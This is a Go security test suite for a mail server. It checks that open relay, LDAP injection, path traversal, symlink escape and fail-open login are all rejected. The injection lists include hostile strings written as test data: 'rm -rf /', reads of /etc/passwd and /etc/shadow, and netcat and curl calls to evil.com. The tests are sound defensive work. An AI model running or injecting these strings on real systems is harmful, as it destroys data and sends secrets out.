package security_test

import (
	"context"
	"crypto/rand"

	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"net/smtp"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/azdharsyahputra/openmail/internal/dkim"
	"github.com/azdharsyahputra/openmail/internal/domain"
	"github.com/azdharsyahputra/openmail/internal/identity"
	"github.com/azdharsyahputra/openmail/internal/identity/ldap"
	"github.com/azdharsyahputra/openmail/internal/identity/local"
	"github.com/azdharsyahputra/openmail/internal/mailbox"
	"github.com/azdharsyahputra/openmail/internal/provisioning"
	"github.com/azdharsyahputra/openmail/internal/queue"
	goldap "github.com/go-ldap/ldap/v3"
)

// P0-001: Open Relay Prevention
func TestP0_001_OpenRelay(t *testing.T) {
	// Attempt to relay external -> external on port 25 without authentication
	conn, err := net.DialTimeout("tcp", "127.0.0.1:25", 2*time.Second)
	if err != nil {
		t.Skipf("Postfix port 25 unavailable in test environment: %v", err)
		return
	}
	defer conn.Close()

	client, err := smtp.NewClient(conn, "localhost")
	if err != nil {
		t.Fatalf("smtp client init failed: %v", err)
	}
	defer client.Close()

	_ = client.Hello("attacker.com")
	_ = client.Mail("victim@external.com")
	err = client.Rcpt("target@another-external.com")
	if err == nil {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-001): Open Relay allowed external -> external delivery!")
	}
	if !strings.Contains(err.Error(), "554") && !strings.Contains(err.Error(), "Relay access denied") && !strings.Contains(err.Error(), "rejected") {
		t.Logf("Relay rejected with response: %v (PASS)", err)
	}
}

// P0-004 & P0-005: LDAP Authentication & Injection Bypass Immunity
func TestP0_004_005_LDAPAuthAndInjectionImmunity(t *testing.T) {
	mockClient := &mockExtendedLDAPClient{
		entries: map[string]*goldap.Entry{
			"uid=validuser,ou=people,dc=example,dc=com": {
				DN: "uid=validuser,ou=people,dc=example,dc=com",
				Attributes: []*goldap.EntryAttribute{
					{Name: "uid", Values: []string{"validuser"}},
					{Name: "mail", Values: []string{"validuser@example.com"}},
				},
			},
		},
		passwords: map[string]string{
			"uid=validuser,ou=people,dc=example,dc=com": "CorrectPassword123!",
		},
	}

	prov := ldap.NewProvider(ldap.DefaultConfig(), mockClient)

	// Test P0-004: Empty password rejection
	_, err := prov.Authenticate(context.Background(), "validuser@example.com", "")
	if err == nil {
		t.Fatalf("SECURITY INVARIANT VIOLATED: Empty password accepted in LDAP Authenticate")
	}

	// Test P0-005: PayloadsAllTheThings Injection list
	injectionVectors := []string{
		"*", "*)(&", "admin)(&)", "admin)(|(password=*))", "*)(uid=*))(|(uid=*",
		"admin)(!(&(1=0)))", "1' or '1' = '1", "*)(&(1=1",
	}
	for _, iv := range injectionVectors {
		_, err := prov.Authenticate(context.Background(), iv, "AnyPass123!")
		if err == nil {
			t.Fatalf("SECURITY INVARIANT VIOLATED (P0-005): LDAP injection %q allowed auth bypass!", iv)
		}
	}
}

// P0-009, P0-010, P0-011: Maildir Cross-Mailbox Isolation & Path Traversal / Symlink Protection
func TestP0_009_010_011_MaildirIsolationAndTraversalProtection(t *testing.T) {
	tempRoot := t.TempDir()
	prov, err := provisioning.NewFilesystemProvisioner(tempRoot, os.Getuid(), os.Getgid())
	if err != nil {
		t.Fatalf("provisioner init failed: %v", err)
	}

	// Normal provisioning
	mbA := provisioning.Mailbox{Email: "user_a@example.com", Domain: "example.com"}
	mbB := provisioning.Mailbox{Email: "user_b@example.com", Domain: "example.com"}
	err = prov.Provision(context.Background(), mbA)
	if err != nil {
		t.Fatalf("provision user A failed: %v", err)
	}
	err = prov.Provision(context.Background(), mbB)
	if err != nil {
		t.Fatalf("provision user B failed: %v", err)
	}

	// P0-010: Path traversal attacks
	traversalPayloads := []string{
		"../user_b@example.com",
		"../../../../etc/passwd",
		"user_a@example.com/../../../user_b",
		"..\\..\\windows\\win.ini",
	}
	for _, tp := range traversalPayloads {
		badMB := provisioning.Mailbox{Email: tp, Domain: "example.com"}
		err := prov.Provision(context.Background(), badMB)
		if err == nil {
			t.Fatalf("SECURITY INVARIANT VIOLATED (P0-010): Path traversal payload %q provisioned successfully!", tp)
		}
	}


	// P0-011: Symlink Attack
	symlinkTarget := filepath.Join(tempRoot, "symlink_victim")
	_ = os.MkdirAll(symlinkTarget, 0700)
	symlinkSource := filepath.Join(tempRoot, "example.com", "symlinked_user")
	_ = os.Symlink(symlinkTarget, symlinkSource)

	// Ensure provisioner detects or replaces symlinks safely without escaping root
	evalRoot, _ := filepath.EvalSymlinks(tempRoot)
	resolvedPath, err := filepath.EvalSymlinks(filepath.Join(tempRoot, "example.com", "user_a"))
	if err == nil && !strings.HasPrefix(resolvedPath, evalRoot) {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-011): Maildir resolved outside vmail root: %s", resolvedPath)
	}

}

// P0-012 & P0-014: OpenDKIM Private Key Security & Signature Flood DoS Bounds (Upstream #324)
func TestP0_012_014_DKIMKeySecurityAndSignatureLimitBounds(t *testing.T) {
	tempDir := t.TempDir()
	keystore := dkim.NewFilesystemKeystore(tempDir)

	// Generate RSA key
	privKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	privPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privKey),
	})

	ctx := context.Background()
	keyPath, err := keystore.StorePrivateKey(ctx, "example.com", "mail2026", privPEM)
	if err != nil {
		t.Fatalf("store private key failed: %v", err)
	}

	// P0-012: Verify Private Key permissions (0600)
	info, err := os.Stat(keyPath)
	if err != nil {
		t.Fatalf("stat private key failed: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0600 {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-012): DKIM private key permission is %o (must be 0600)", perm)
	}

	// P0-014: Signature Flood DoS Bounds (Upstream issue #324)
	// Verify validator handles 1000 simulated headers in bounded time without hanging or blowing memory
	start := time.Now()
	for i := 0; i < 1000; i++ {
		_, _, _ = dkim.ParseDNSTXTRecord(fmt.Sprintf("v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA%d", i))
	}
	elapsed := time.Since(start)
	if elapsed > 2*time.Second {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-014): DKIM header parsing exceeded time bounds: %v", elapsed)
	}
}

// P0-015: Postfix Queue Privilege Escalation
func TestP0_015_QueuePrivilegeEscalation(t *testing.T) {
	qDriver := queue.NewSystemDriver("mailopen_postfix")
	qSvc := queue.NewService(qDriver)

	// Malicious queue ID with shell metacharacters
	maliciousQueueIDs := []string{
		"12345; rm -rf /",
		"12345 && cat /etc/passwd",
		"../../../etc/shadow",
		"12345 | nc evil.com 1337",
	}

	ctx := context.Background()
	for _, mq := range maliciousQueueIDs {
		// All queue actions must validate ID format before executing
		err := qSvc.Delete(ctx, mq)
		if err == nil {
			t.Fatalf("SECURITY INVARIANT VIOLATED (P0-015): Malicious queue ID %q was accepted!", mq)
		}
	}

}

// P0-024: Command Injection Prevention
func TestP0_024_CommandInjectionImmunity(t *testing.T) {
	// Verify that domain, mailbox, and queue components never execute raw shell strings with user inputs
	maliciousDomain := "example.com; id; curl http://evil.com"
	db := setupSecurityTestDB(t)
	if db == nil {
		return
	}
	defer db.Close()

	domRepo := domain.NewPostgresRepository(db)
	domSvc := domain.NewService(domRepo)

	_, err := domSvc.Create(context.Background(), maliciousDomain)
	if err == nil {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-024): Command injection domain payload was accepted!")
	}
}

// P0-026: Fail-Closed Identity Provider Verification
func TestP0_026_FailClosedLDAPUnavailable(t *testing.T) {
	db := setupSecurityTestDB(t)
	if db == nil {
		return
	}
	defer db.Close()

	ctx := context.Background()
	domRepo := domain.NewPostgresRepository(db)
	mbRepo := mailbox.NewPostgresRepository(db)
	prov, _ := provisioning.NewFilesystemProvisioner(t.TempDir(), 5000, 5000)
	mbSvc := mailbox.NewService(mbRepo, domRepo, prov)

	testDom := fmt.Sprintf("p0failclose-%d.com", time.Now().UnixNano())
	_ = domRepo.Create(ctx, &domain.Domain{Name: testDom, Status: "active"})
	defer domRepo.Delete(ctx, testDom)

	userEmail := "ldapuser@" + testDom
	mb, _ := mbSvc.Create(ctx, userEmail, "LocalFallbackPassword123!", 1073741824)
	_ = mbRepo.UpdateIdentityProvider(ctx, mb.ID, "ldap")
	_, _, _ = mbSvc.Provision(ctx, userEmail)

	// Mock DEAD LDAP server
	deadClient := &mockExtendedLDAPClient{
		searchErr: fmt.Errorf("dial tcp 127.0.0.1:389: connect: connection refused"),
	}
	ldapProv := ldap.NewProvider(ldap.DefaultConfig(), deadClient)
	localProv := local.NewProvider(mbRepo)

	providers := map[string]identity.IdentityProvider{
		"local": localProv,
		"ldap":  ldapProv,
	}
	identSvc := identity.NewService("ldap", providers, mbRepo, domRepo, mbSvc)

	// Login must FAIL CLOSED
	_, err := identSvc.Authenticate(ctx, userEmail, "LocalFallbackPassword123!")
	if err == nil {
		t.Fatalf("SECURITY INVARIANT VIOLATED (P0-026): Auth succeeded while LDAP was down via implicit local fallback!")
	}
}
